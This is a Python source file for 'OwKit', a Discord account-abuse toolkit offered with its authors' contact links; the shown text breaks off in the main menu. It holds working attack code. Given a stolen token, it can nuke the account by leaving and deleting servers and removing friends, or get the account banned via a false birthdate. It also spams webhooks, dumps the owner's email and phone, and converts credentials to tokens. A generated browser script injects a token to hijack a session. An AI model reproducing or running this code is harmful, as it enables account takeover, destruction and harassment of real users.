import requests
import discord
import os
import sys
import colorama
import threading
from itertools import cycle
from datetime import datetime
from colorama import Fore, init, Style
import ctypes
import urllib
import time
import json
import random
import string
import itertools
from re import findall
import json
import platform as plt
from json import loads, dumps
from base64 import b64decode
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen
from datetime import datetime
from threading import Thread
from time import sleep
from sys import argv
from itertools import cycle
import base64
from random import randint
from time import gmtime, sleep, strftime
from discord.ext import commands
from discord.ext.commands import Bot
import keyboard
import aiohttp
import re, os
from re import findall
import json
import platform as plt
from json import loads, dumps
from base64 import b64decode
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen
from datetime import datetime
from threading import Thread
from time import sleep
from sys import argv
import psutil
def Spinner():
    ctypes.windll.kernel32.SetConsoleTitleW(f'[OwKit] | Loading')
    os.system('cls')
    l = ['|', '/', '-', '\\']
    for i in l+l+l+l+l+l+l+l+l+l+l+l+l:
        sys.stdout.write('\r' + f'{Fore.GREEN}[*] Loading... '+i)
        sys.stdout.flush()
        time.sleep(0.2)
Spinner()
def nuketoken():
  os.system('cls')
  ctypes.windll.kernel32.SetConsoleTitleW(f'[OwKit] | Nuke Token')
  print(f'''\u001b[32m
   ██████╗ ██╗    ██╗██╗  ██╗██╗████████╗
  ██╔═══██╗██║    ██║██║ ██╔╝██║╚══██╔══╝
  ██║   ██║██║ █╗ ██║█████╔╝ ██║   ██║
  ██║   ██║██║███╗██║██╔═██╗ ██║   ██║
  ╚██████╔╝╚███╔███╔╝██║  ██╗██║   ██║
   ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝   ╚═╝
         {Fore.CYAN}{Style.BRIGHT} ●  Discord: Monster.#0001, Yum                            {Fore.RESET}
         {Fore.CYAN}{Style.BRIGHT} ●  Server : https://discord.gg/hkSphbTZVE {Fore.RESET}
         {Fore.CYAN}{Style.BRIGHT} ●  Github : https://github.com/Monsterdot0001      {Fore.RESET}
        ''')

  token = input(f'{Fore.RED}{Style.BRIGHT}[?]{Fore.RESET} Token: ')
  headers = {'Authorization': token, 'Content-Type': 'application/json'}  
  r = requests.get('https://discord.com/api/v8/users/@me', headers=headers)
  if r.status_code == 200:
    amount = int(input(f'{Fore.RED}{Style.BRIGHT}[?]{Fore.RESET} Guild Amount: '))
    name = input(f'{Fore.RED}{Style.BRIGHT}[?]{Fore.RESET} Guild Name: ')
    print('')
    print('')
    print(f'{Fore.GREEN}Token is valid.{Fore.RESET}')
    try:
      bot = commands.Bot(command_prefix='-', self_bot=True)
      bot.remove_command("help")

      @bot.event
      async def on_ready(times : int=100):

        print("Leaving Guilds")
        for guild in bot.guilds:
            try:
                await guild.leave()
                print(f'Left: [{guild.name}]')
            except:
                print(f'Failed: [{guild.name}]')

        print("Deleting Guilds")
        for guild in bot.guilds:
            try:
                await guild.delete()
                print(f'Deleted Guild: [{guild.name}]')
            except:
                print(f'Failed: [{guild.name}]')

        print("Removing Relationships")
        for user in bot.user.friends:
            try:
                await user.remove_friend()
                print(f'Removed Relationship: {user}')
            except:
                print(f"Failed: {user}")

        print("Creating Guilds")
        for i in range(amount):
            await bot.create_guild(f'{name}', region=None, icon=None)
            print(f'Server Created: [{i}]')

        print(f'{Fore.GREEN}Successfully nuked account{Fore.RESET}')
        input(f'Press [Enter] key to go back to Main Menu.')
        mainMenu()

      bot.run(token, bot=False)
    except ValueError:
      print(f'{Fore.RED}Invalid choice{Fore.RESET}')
      print(f'Press [Enter] key to go back to Main Menu.')
      while True:
        if keyboard.is_pressed('enter'):
          os.system('cls')
          mainMenu()
  else:
    print(f'{Fore.RED}Invalid token{Fore.RESET}')
    print(f'Press [Enter] key to go back to Main Menu.')
    while True:
      if keyboard.is_pressed('enter'):
        os.system('cls')
        mainMenu()
def unverifytoken():
    os.system('cls')
    ctypes.windll.kernel32.SetConsoleTitleW(f'[OwKit] | Unverify Token')
    print(f'''\u001b[32m
   ██████╗ ██╗    ██╗██╗  ██╗██╗████████╗
  ██╔═══██╗██║    ██║██║ ██╔╝██║╚══██╔══╝
  ██║   ██║██║ █╗ ██║█████╔╝ ██║   ██║   
  ██║   ██║██║███╗██║██╔═██╗ ██║   ██║   
  ╚██████╔╝╚███╔███╔╝██║  ██╗██║   ██║   
   ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝   ╚═╝                                                      
         {Fore.CYAN}{Style.BRIGHT} ●  Discord: Monster.#0001, Yum                            {Fore.RESET}
         {Fore.CYAN}{Style.BRIGHT} ●  Server : https://discord.gg/hkSphbTZVE {Fore.RESET}
         {Fore.CYAN}{Style.BRIGHT} ●  Github : https://github.com/Monsterdot0001      {Fore.RESET}
            ''')

    token = input(f'{Fore.RED}{Style.BRIGHT}[?]{Fore.RESET} Token: ')
    headers = {'Authorization': token, 'Content-Type': 'application/json'}  
    r = requests.get('https://discord.com/api/v8/users/@me', headers=headers)
    if r.status_code == 200:
        r = requests.post('https://discordapp.com/api/v8/users/@me/relationships', headers={'Authorization': token, 'User-Agent': 'discordbot'}, json={'username': 'LMAO', 'discriminator': 6572})
        if r.status_code == 204:
            print(f'{Fore.GREEN}Successfully unverified.{Fore.RESET}')
            print(f'Press [Enter] key to go back to Main Menu.')
            while True:
              if keyboard.is_pressed('enter'):
                os.system('cls')
                mainMenu()
        else:
          print(f'{Fore.RED}Failed to unverify token{Fore.RESET}')
          print(f'Press [Enter] key to go back to Main Menu.')
          while True:
            if keyboard.is_pressed('enter'):
              os.system('cls')
              mainMenu()
    else:
        print(f'{Fore.RED}Invalid token{Fore.RESET}')
        print(f'Press [Enter] key to go back to Main Menu.')
        while True:
          if keyboard.is_pressed('enter'):
            os.system('cls')
            mainMenu()
def bantoken():
    os.system('cls')
    ctypes.windll.kernel32.SetConsoleTitleW(f'[OwKit] | Ban Token')
    print(f'''\u001b[32m
   ██████╗ ██╗    ██╗██╗  ██╗██╗████████╗
  ██╔═══██╗██║    ██║██║ ██╔╝██║╚══██╔══╝
  ██║   ██║██║ █╗ ██║█████╔╝ ██║   ██║   
  ██║   ██║██║███╗██║██╔═██╗ ██║   ██║   
  ╚██████╔╝╚███╔███╔╝██║  ██╗██║   ██║   
   ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝   ╚═╝                                                         
         {Fore.CYAN}{Style.BRIGHT} ●  Discord: Monster.#0001, Yum                            {Fore.RESET}
         {Fore.CYAN}{Style.BRIGHT} ●  Server : https://discord.gg/hkSphbTZVE {Fore.RESET}
         {Fore.CYAN}{Style.BRIGHT} ●  Github : https://github.com/Monsterdot0001      {Fore.RESET}
            ''')
    token = input(f'{Fore.RED}{Style.BRIGHT}[?]{Fore.RESET} Token: ')
    headers = {'Authorization': token, 'Content-Type': 'application/json'}  
    r = requests.get('https://discord.com/api/v8/users/@me', headers=headers)
    if r.status_code == 200:
        r = requests.patch('https://discordapp.com/api/v8/users/@me', headers={'Authorization': token}, json={'date_of_birth': '2015-7-16'})
        if r.status_code == 400:
          print(f'{Fore.GREEN}Successfully banned token{Fore.RESET}')
          print(f'Press [Enter] key to go back to Main Menu.')
          while True:
            if keyboard.is_pressed('enter'):
              os.system('cls')
              mainMenu()
        else:
          print(f'{Fore.RED}Failed to ban token{Fore.RESET}')
          print(f'Press [Enter] key to go back to Main Menu.')
          while True:
            if keyboard.is_pressed('enter'):
              os.system('cls')
              mainMenu()
    else:
        print(f'{Fore.RED}Invalid token{Fore.RESET}')
        input('Press [Enter] key to go back to Main Menu.')
        mainMenu()
        os.system('cls')
def tokenfromuserid():
    os.system('cls')
    ctypes.windll.kernel32.SetConsoleTitleW(f'[OwKit] | Half Token From User ID')
    print(f'''\u001b[32m
   ██████╗ ██╗    ██╗██╗  ██╗██╗████████╗
  ██╔═══██╗██║    ██║██║ ██╔╝██║╚══██╔══╝
  ██║   ██║██║ █╗ ██║█████╔╝ ██║   ██║   
  ██║   ██║██║███╗██║██╔═██╗ ██║   ██║   
  ╚██████╔╝╚███╔███╔╝██║  ██╗██║   ██║   
   ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝   ╚═╝                                                              
         {Fore.CYAN}{Style.BRIGHT} ●  Discord: Monster.#0001, Yum                            {Fore.RESET}
         {Fore.CYAN}{Style.BRIGHT} ●  Server : https://discord.gg/hkSphbTZVE {Fore.RESET}
         {Fore.CYAN}{Style.BRIGHT} ●  Github : https://github.com/Monsterdot0001      {Fore.RESET}
            ''')
    userid = input(f'{Fore.RED}{Style.BRIGHT}[?]{Fore.RESET} ID: ')
    string_b = f"{userid}".encode('utf')
    bas64_bytes = base64.b64encode(string_b)
    print(bas64_bytes.decode('utf-8'))
    print(f'Press [Enter] key to go back to Main Menu.')
    while True:
      if keyboard.is_pressed('enter'):
        os.system('cls')
        mainMenu()
def tokenvalidator():
    os.system('cls')
    ctypes.windll.kernel32.SetConsoleTitleW(f'[OwKit] | Token Validator')
    print(f'''\u001b[32m
   ██████╗ ██╗    ██╗██╗  ██╗██╗████████╗
  ██╔═══██╗██║    ██║██║ ██╔╝██║╚══██╔══╝
  ██║   ██║██║ █╗ ██║█████╔╝ ██║   ██║   
  ██║   ██║██║███╗██║██╔═██╗ ██║   ██║   
  ╚██████╔╝╚███╔███╔╝██║  ██╗██║   ██║   
   ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝   ╚═╝                                                        
         {Fore.CYAN}{Style.BRIGHT} ●  Discord: Monster.#0001, Yum                            {Fore.RESET}
         {Fore.CYAN}{Style.BRIGHT} ●  Server : https://discord.gg/hkSphbTZVE {Fore.RESET}
         {Fore.CYAN}{Style.BRIGHT} ●  Github : https://github.com/Monsterdot0001      {Fore.RESET}
            ''')
    token = input(f'{Fore.RED}{Style.BRIGHT}[?]{Fore.RESET} Token: ')
    headers = {'Authorization': token, 'Content-Type': 'application/json'}  
    r = requests.get('https://discord.com/api/v8/users/@me', headers=headers)
    if r.status_code == 200:
        print(f'{Fore.GREEN}Token valid.{Fore.RESET}')
        print(f'Press [Enter] key to go back to Main Menu.')
        while True:
          if keyboard.is_pressed('enter'):
            os.system('cls')
            mainMenu()
    else:
        print(f'{Fore.RED}Invalid token.{Fore.RESET}')
        print(f'Press [Enter] key to go back to Main Menu.')
        while True:
          if keyboard.is_pressed('enter'):
            os.system('cls')
            mainMenu()
def hypesquad():
    os.system('cls')
    ctypes.windll.kernel32.SetConsoleTitleW(f'[OwKit] | Hypesquad Changer')
    print(f'''\u001b[32m
   ██████╗ ██╗    ██╗██╗  ██╗██╗████████╗
  ██╔═══██╗██║    ██║██║ ██╔╝██║╚══██╔══╝
  ██║   ██║██║ █╗ ██║█████╔╝ ██║   ██║   
  ██║   ██║██║███╗██║██╔═██╗ ██║   ██║   
  ╚██████╔╝╚███╔███╔╝██║  ██╗██║   ██║   
   ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝   ╚═╝  
         {Fore.CYAN}{Style.BRIGHT} ●  Discord: Monster.#0001, Yum                            {Fore.RESET}
         {Fore.CYAN}{Style.BRIGHT} ●  Server : https://discord.gg/hkSphbTZVE {Fore.RESET}
         {Fore.CYAN}{Style.BRIGHT} ●  Github : https://github.com/Monsterdot0001      {Fore.RESET}
            ''')
    print(f"""

        {Fore.MAGENTA}(1){Fore.RESET} Bravery
        {Fore.MAGENTA}(2){Fore.RESET} Brilliance
        {Fore.MAGENTA}(3){Fore.RESET} Balance
        """)
    house = input(f'{Fore.RED}{Style.BRIGHT}[?]{Fore.RESET} Your choice: ')
    token = input(f'{Fore.RED}{Style.BRIGHT}[?]{Fore.RESET} Token: ')
    headers = {'Authorization': token, 'Content-Type': 'application/json'}  
    r = requests.get('https://discord.com/api/v8/users/@me', headers=headers)
    if r.status_code == 200:

      headers = {
            'Authorization': token,
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
        }
      if house == "1":
          payload = {'house_id': 1}
      elif house == "2":
          payload = {'house_id': 2}
      elif house == "3":
          payload = {'house_id': 3}
      r = requests.post('https://discordapp.com/api/v6/hypesquad/online', headers=headers, json=payload, timeout=10)
      if r.status_code == 204:
        print(f'{Fore.GREEN}Successfully changed your hypesquad{Fore.RESET}')
        print(f'Press [Enter] key to go back to Main Menu.')
        while True:
          if keyboard.is_pressed('enter'):
            os.system('cls')
            mainMenu()
    else:
      print(f'{Fore.RED}Invalid token{Fore.RESET}')
      print(f'Press [Enter] key to go back to Main Menu.')
      while True:
        if keyboard.is_pressed('enter'):
          os.system('cls')
          mainMenu()
def nitrogen():
    os.system('cls')
    ctypes.windll.kernel32.SetConsoleTitleW(f'[OwKit] | Nitro Generator')
    print(f'''\u001b[32m
   ██████╗ ██╗    ██╗██╗  ██╗██╗████████╗
  ██╔═══██╗██║    ██║██║ ██╔╝██║╚══██╔══╝
  ██║   ██║██║ █╗ ██║█████╔╝ ██║   ██║   
  ██║   ██║██║███╗██║██╔═██╗ ██║   ██║   
  ╚██████╔╝╚███╔███╔╝██║  ██╗██║   ██║   
   ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝   ╚═╝      
         {Fore.CYAN}{Style.BRIGHT} ●  Discord: Monster.#0001, Yum                            {Fore.RESET}
         {Fore.CYAN}{Style.BRIGHT} ●  Server : https://discord.gg/hkSphbTZVE {Fore.RESET}
         {Fore.CYAN}{Style.BRIGHT} ●  Github : https://github.com/Monsterdot0001      {Fore.RESET}
            ''')
    try:
      amount = int(input(f'{Fore.RED}{Style.BRIGHT}[?]{Fore.RESET} Amount: '))
      value = 1
      while value <= amount:
        code = "https://discord.gift/" + ('').join(random.choices(string.ascii_letters + string.digits, k=16))
        f = open(f'Nitro codes ({amount}).txt', "a+")
        f.write(f'{code}\n')
        f.close()
        print(f'{code}')
        value += 1
      print('')
      print(f'Press [Enter] key to go back to Main Menu.')
      while True:
        if keyboard.is_pressed('enter'):
          os.system('cls')
          mainMenu()
    except ValueError:
      print(f'{Fore.RED}Invalid choice{Fore.RESET}')
      print(f'Press [Enter] key to go back to Main Menu.')
      while True:
        if keyboard.is_pressed('enter'):
          os.system('cls')
          mainMenu()
def tokengen():
  os.system('cls')
  ctypes.windll.kernel32.SetConsoleTitleW(f'[OwKit] | Token Generator')
  print(f'''\u001b[32m
   ██████╗ ██╗    ██╗██╗  ██╗██╗████████╗
  ██╔═══██╗██║    ██║██║ ██╔╝██║╚══██╔══╝
  ██║   ██║██║ █╗ ██║█████╔╝ ██║   ██║   
  ██║   ██║██║███╗██║██╔═██╗ ██║   ██║   
  ╚██████╔╝╚███╔███╔╝██║  ██╗██║   ██║   
   ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝   ╚═╝  
         {Fore.CYAN}{Style.BRIGHT} ●  Discord: Monster.#0001                            {Fore.RESET}
         {Fore.CYAN}{Style.BRIGHT} ●  Server : https://discord.gg/hkSphbTZVE {Fore.RESET}
         {Fore.CYAN}{Style.BRIGHT} ●  Github : https://github.com/Monsterdot0001      {Fore.RESET}
            ''')

  try:
    amount = int(input(f'{Fore.RED}{Style.BRIGHT}[?]{Fore.RESET} Amount: '))
    value = 1
    while value <= amount:
      code = "Nz" + ('').join(random.choices(string.ascii_letters + string.digits, k=59))
      f = open(f'Tokens ({amount}).txt', "a+")
      f.write(f'{code}\n')
      f.close()
      print(f'{code}')
      value += 1
    print('')
    print(f'Press [Enter] key to go back to Main Menu.')
    while True:
      if keyboard.is_pressed('enter'):
        os.system('cls')
        mainMenu()
  except ValueError:
    print(f'{Fore.RED}Invalid choice{Fore.RESET}')
    print(f'Press [Enter] key to go back to Main Menu.')
    while True:
      if keyboard.is_pressed('enter'):
        os.system('cls')
        mainMenu()
def trolltoken():
    os.system('cls')
    ctypes.windll.kernel32.SetConsoleTitleW(f'[OwKit] | Troll Token')
    print(f'''\u001b[32m
   ██████╗ ██╗    ██╗██╗  ██╗██╗████████╗
  ██╔═══██╗██║    ██║██║ ██╔╝██║╚══██╔══╝
  ██║   ██║██║ █╗ ██║█████╔╝ ██║   ██║   
  ██║   ██║██║███╗██║██╔═██╗ ██║   ██║   
  ╚██████╔╝╚███╔███╔╝██║  ██╗██║   ██║   
   ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝   ╚═╝      
         {Fore.CYAN}{Style.BRIGHT} ●  Discord: Monster.#0001, Yum                            {Fore.RESET}
         {Fore.CYAN}{Style.BRIGHT} ●  Server : https://discord.gg/hkSphbTZVE {Fore.RESET}
         {Fore.CYAN}{Style.BRIGHT} ●  Github : https://github.com/Monsterdot0001      {Fore.RESET}
            ''')


    token = input(f'{Fore.RED}{Style.BRIGHT}[?]{Fore.RESET} Token: ')
    headers = {'Authorization': token, 'Content-Type': 'application/json'}  
    r = requests.get('https://discord.com/api/v8/users/@me', headers=headers)
    if r.status_code == 200:

      amount = int(input(f'{Fore.RED}{Style.BRIGHT}[?]{Fore.RESET} Amount: '))
      modes = cycle(["light", "dark"])

      for i in range(amount):
        t = threading.Thread(target=trolltoken, args=(i,))
        print(f'{Fore.GREEN}Token has been trolled [{i}]')
        time.sleep(0.12)
        setting = {'theme': next(modes)}
        requests.patch("https://discord.com/api/v8/users/@me/settings", headers=headers, json=setting)
      print(f'{Fore.GREEN}Finished trolling{Fore.RESET}')
      print('Press [Enter] key to go back to Main Menu.')
      while True:
        if keyboard.is_pressed('enter'):
          mainMenu()
          os.system('cls')
    else:
      print(f'{Fore.RED}Invalid choice{Fore.RESET}')
      print(f'Press [Enter] key to go back to Main Menu.')
      while True:
        if keyboard.is_pressed('enter'):
          os.system('cls')
          mainMenu()
def tokeninfo():
    os.system('cls')
    ctypes.windll.kernel32.SetConsoleTitleW(f'[OwKit] | Token Info')
    print(f'''\u001b[32m
   ██████╗ ██╗    ██╗██╗  ██╗██╗████████╗
  ██╔═══██╗██║    ██║██║ ██╔╝██║╚══██╔══╝
  ██║   ██║██║ █╗ ██║█████╔╝ ██║   ██║   
  ██║   ██║██║███╗██║██╔═██╗ ██║   ██║   
  ╚██████╔╝╚███╔███╔╝██║  ██╗██║   ██║   
   ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝   ╚═╝    
         {Fore.CYAN}{Style.BRIGHT} ●  Discord: Monster.#0001, Yum                            {Fore.RESET}
         {Fore.CYAN}{Style.BRIGHT} ●  Server : https://discord.gg/hkSphbTZVE {Fore.RESET}
         {Fore.CYAN}{Style.BRIGHT} ●  Github : https://github.com/Monsterdot0001      {Fore.RESET}
            ''')
    token = input(f'{Fore.RED}{Style.BRIGHT}[?]{Fore.RESET} Token: ')
    headers = {'Authorization': token, 'Content-Type': 'application/json'}  
    r = requests.get('https://discord.com/api/v8/users/@me', headers=headers)
    if r.status_code == 200:
      print(f'{Fore.GREEN}Token is valid.{Fore.RESET}')
      userName = r.json()['username'] + '#' + r.json()['discriminator']
      userID = r.json()['id']
      phone = r.json()['phone']
      email = r.json()['email']
      mfa = r.json()['mfa_enabled']
      verified = r.json()['verified']
      print(f'''
User: {userName}
ID: {userID}
Phone: {phone}
Email: {email}
MFA: {mfa}
Verified: {verified}
Token: {token}
            ''')
      print(f'Press [Enter] key to go back to Main Menu.')
      while True:
        if keyboard.is_pressed('enter'):
          mainMenu()
          os.system('cls')
    else:
      print(f'{Fore.RED}Invalid token{Fore.RESET}')
      print(f'Press [Enter] key to go back to Main Menu.')
      if keyboard.is_pressed('enter'):
        mainMenu()
        os.system('cls')
def informations():
    os.system('cls')
    ctypes.windll.kernel32.SetConsoleTitleW(f'[OwKit] | Informations & contact')
    print(f'''\u001b[32m
   ██████╗ ██╗    ██╗██╗  ██╗██╗████████╗
  ██╔═══██╗██║    ██║██║ ██╔╝██║╚══██╔══╝
  ██║   ██║██║ █╗ ██║█████╔╝ ██║   ██║   
  ██║   ██║██║███╗██║██╔═██╗ ██║   ██║   
  ╚██████╔╝╚███╔███╔╝██║  ██╗██║   ██║   
   ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝   ╚═╝                                          
         {Fore.CYAN}{Style.BRIGHT} ●  Discord: Monster.#0001, Yum                            {Fore.RESET}
         {Fore.CYAN}{Style.BRIGHT} ●  Server : https://discord.gg/hkSphbTZVE {Fore.RESET}
         {Fore.CYAN}{Style.BRIGHT} ●  Github : https://github.com/Monsterdot0001      {Fore.RESET}
            ''')
    fh = open('Information & contact.txt', 'w', encoding='utf-8')
    fh.write("""
        Discord User: Monster.#6666, Yum
        Discord Server: https://discord.gg/hkSphbTZVE
        Github: https://github.com/Monsterdot0001
        """)
    fh.close()
    print(f""" 
        Discord User: Monster.#0001, Yum
        Discord Server: https://discord.gg/hkSphbTZVE
        Github: https://github.com/Monsterdot0001
        """)
    print(f'Press [Enter] key to go back to Main Menu.')
    while True:
      if keyboard.is_pressed('enter'):
        mainMenu()
        os.system('cls')
def tokenfetcher():
    os.system('cls')
    ctypes.windll.kernel32.SetConsoleTitleW(f'[OwKit] Made by Monster.#0001 | Get token from email:password')
    print(f'''\u001b[32m
   ██████╗ ██╗    ██╗██╗  ██╗██╗████████╗
  ██╔═══██╗██║    ██║██║ ██╔╝██║╚══██╔══╝
  ██║   ██║██║ █╗ ██║█████╔╝ ██║   ██║   
  ██║   ██║██║███╗██║██╔═██╗ ██║   ██║   
  ╚██████╔╝╚███╔███╔╝██║  ██╗██║   ██║   
   ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝   ╚═╝                                       
         {Fore.CYAN}{Style.BRIGHT} ●  Discord: Monster.#0001, Yum                            {Fore.RESET}
         {Fore.CYAN}{Style.BRIGHT} ●  Server : https://discord.gg/hkSphbTZVE {Fore.RESET}
         {Fore.CYAN}{Style.BRIGHT} ●  Github : https://github.com/Monsterdot0001      {Fore.RESET}
            ''')


    email = input(f'{Fore.RED}{Style.BRIGHT}[?]{Fore.RESET} Email: ')
    password = input(f'{Fore.RED}{Style.BRIGHT}[?]{Fore.RESET} Password: ')
    data={'email': email, 'password': password, 'undelete': "false"}
    headers={'content-type': "application/json", 'user-agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36"}
    r = requests.post('https://discord.com/api/v8/auth/login', json=data, headers=headers)
    if r.status_code == 200:
        token = r.json()['token']
        print(f'Token: {token}')
        print(f'Press [Enter] key to go back to Main Menu.')
        if keyboard.is_pressed('enter'):
          mainMenu()
          os.system('cls')
    elif "PASSWORD_DOES_NOT_MATCH" in r.text:
        print(f'{Fore.RED}Invalid Password{Fore.RESET}')    
        print(f'Press [Enter] key to go back to Main Menu.')
        if keyboard.is_pressed('enter'):
          mainMenu()
          os.system('cls')
    elif "captcha-required" in r.text:
        print(f'{Fore.RED}Discord Returned Captcha, Try Again Later{Fore.RESET}')   
        print(f'Press [Enter] key to go back to Main Menu.')
        if keyboard.is_pressed('enter'):
          mainMenu()
          os.system('cls')
    else:
      print(f'{Fore.RED}Invalid choice{Fore.RESET}')
      print(f'Press [Enter] key to go back to Main Menu.')
      while True:
        if keyboard.is_pressed('enter'):
          os.system('cls')
          mainMenu()
def checkwebhook():
  os.system('cls')
  ctypes.windll.kernel32.SetConsoleTitleW(f'[OwKit] | Check Webhook')
  print(f'''\u001b[32m
   ██████╗ ██╗    ██╗██╗  ██╗██╗████████╗
  ██╔═══██╗██║    ██║██║ ██╔╝██║╚══██╔══╝
  ██║   ██║██║ █╗ ██║█████╔╝ ██║   ██║   
  ██║   ██║██║███╗██║██╔═██╗ ██║   ██║   
  ╚██████╔╝╚███╔███╔╝██║  ██╗██║   ██║   
   ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝   ╚═╝                                    
         {Fore.CYAN}{Style.BRIGHT} ●  Discord: Monster.#0001, Yum                            {Fore.RESET}
         {Fore.CYAN}{Style.BRIGHT} ●  Server : https://discord.gg/hkSphbTZVE {Fore.RESET}
         {Fore.CYAN}{Style.BRIGHT} ●  Github : https://github.com/Monsterdot0001      {Fore.RESET}
            ''')

  webhook = input(f'\n{Fore.RED}{Style.BRIGHT}[?] {Fore.RESET}Webhook: ')
  message = ('_ _')
  try:
    _data = requests.post(webhook, json={'content': message}, headers={'Content-Type': 'application/json'})
    if _data.status_code < 400:
      print(f'\n{Fore.GREEN}Webhook valid{Fore.RESET}')
      input('\nPress [Enter] to go back to Main Menu.')
      mainMenu()
  except:
    print(f'\n{Fore.RED}{Style.BRIGHT}[?] {Fore.RESET}Invalid Webhook')
    input('\nPress [Enter] to go back to Main Menu.')
    mainMenu()
def spamwebhook():
  os.system('cls')
  ctypes.windll.kernel32.SetConsoleTitleW(f'[OwKit] | Spam Webhook')
  print(f'''\u001b[32m
   ██████╗ ██╗    ██╗██╗  ██╗██╗████████╗
  ██╔═══██╗██║    ██║██║ ██╔╝██║╚══██╔══╝
  ██║   ██║██║ █╗ ██║█████╔╝ ██║   ██║   
  ██║   ██║██║███╗██║██╔═██╗ ██║   ██║   
  ╚██████╔╝╚███╔███╔╝██║  ██╗██║   ██║   
   ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝   ╚═╝                                    
         {Fore.CYAN}{Style.BRIGHT} ●  Discord: Monster.#0001, Yum                            {Fore.RESET}
         {Fore.CYAN}{Style.BRIGHT} ●  Server : https://discord.gg/hkSphbTZVE {Fore.RESET}
         {Fore.CYAN}{Style.BRIGHT} ●  Github : https://github.com/Monsterdot0001      {Fore.RESET}
            ''')
  webhook = input(f'{Fore.RED}{Style.BRIGHT}[?]{Fore.RESET} Webhook: ')
  message = input(f'{Fore.RED}{Style.BRIGHT}[?]{Fore.RESET} Message: ')
  amount = int(input(f'{Fore.RED}{Style.BRIGHT}[?]{Fore.RESET} Amount:'))
  try:
    for i in range(amount):
      _data = requests.post(webhook, json={'content': message}, headers={'Content-Type': 'application/json'})
      if _data.status_code < 400:
        print(f'Sent new message [{i}]')
    print(f'Press [Enter] key to go back to Main Menu.')
    while True:
      if keyboard.is_pressed('enter'):
        mainMenu()
        os.system('cls')
  except:
    print(f'\n{Fore.RED}{Style.BRIGHT}[?] {Fore.RESET}Invalid Webhook\n')
    print(f'Press [Enter] key to go back to Main Menu.')
    while True:
      if keyboard.is_pressed('enter'):
        mainMenu()
        os.system('cls')

def tokenlogin():
  os.system('cls')
  ctypes.windll.kernel32.SetConsoleTitleW(f'[OwKit] | Token Login')
  print(f'''\u001b[32m
   ██████╗ ██╗    ██╗██╗  ██╗██╗████████╗
  ██╔═══██╗██║    ██║██║ ██╔╝██║╚══██╔══╝
  ██║   ██║██║ █╗ ██║█████╔╝ ██║   ██║   
  ██║   ██║██║███╗██║██╔═██╗ ██║   ██║   
  ╚██████╔╝╚███╔███╔╝██║  ██╗██║   ██║   
   ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝   ╚═╝                                    
         {Fore.CYAN}{Style.BRIGHT} ●  Discord: Monster.#0001                            {Fore.RESET}
         {Fore.CYAN}{Style.BRIGHT} ●  Server : https://discord.gg/hkSphbTZVE {Fore.RESET}
         {Fore.CYAN}{Style.BRIGHT} ●  Github : https://github.com/Monsterdot0001      {Fore.RESET}
            ''')
  token = input(f'{Fore.RED}{Style.BRIGHT}[?]{Fore.RESET} Token: ')
  headers = {'Authorization': token, 'Content-Type': 'application/json'}  
  r = requests.get('https://discord.com/api/v8/users/@me', headers=headers)
  if r.status_code == 200:
    fh = open('Token Login Script.txt', 'w', encoding='utf-8')
    fh.write('''
              const login = (token) => {
                  setInterval(() => document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`, 50);
                  setTimeout(() => location.reload(), 2500);
              };''' + f'login("{token}")')
    fh.close()
    print(f'Press [Enter] key to go back to Main Menu.')
    while True:
      if keyboard.is_pressed('enter'):
        mainMenu()
        os.system('cls')
  else:
    print(f"{Fore.RED}Invalid token{Fore.RESET}")
    print(f'Press [Enter] key to go back to Main Menu.')
    while True:
      if keyboard.is_pressed('enter'):
        mainMenu()
        os.system('cls')
def getBanner():
    os.system('cls')
    ctypes.windll.kernel32.SetConsoleTitleW(f'[OwKit] | Main Menu')
    banner = f'''{Fore.GREEN}{Style.BRIGHT}
   ██████╗ ██╗    ██╗██╗  ██╗██╗████████╗
  ██╔═══██╗██║    ██║██║ ██╔╝██║╚══██╔══╝
  ██║   ██║██║ █╗ ██║█████╔╝ ██║   ██║   
  ██║   ██║██║███╗██║██╔═██╗ ██║   ██║   
  ╚██████╔╝╚███╔███╔╝██║  ██╗██║   ██║   
   ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝   ╚═╝    
         {Fore.CYAN}{Style.BRIGHT} ●  Discord: Yum, Monster, Aced                            {Fore.RESET}
         {Fore.CYAN}{Style.BRIGHT} ●  Server : https://discord.gg/hkSphbTZVE {Fore.RESET}
         {Fore.CYAN}{Style.BRIGHT} ●  Github : https://github.com/Monsterdot0001      {Fore.RESET}

        {Fore.BLUE}═══════════════════════════════════════════════════════════════════{Fore.RESET}

        {Fore.MAGENTA}(1){Fore.RESET}{Fore.WHITE} Get token from email:password          {Fore.MAGENTA}(9){Fore.RESET}{Fore.WHITE} Change Hypesquad house
        {Fore.MAGENTA}(2){Fore.RESET}{Fore.WHITE} Nuke token                             {Fore.MAGENTA}(10){Fore.RESET}{Fore.WHITE} Token validator
        {Fore.MAGENTA}(3){Fore.RESET}{Fore.WHITE} Ban token                              {Fore.MAGENTA}(11){Fore.RESET}{Fore.WHITE} Spam webhook
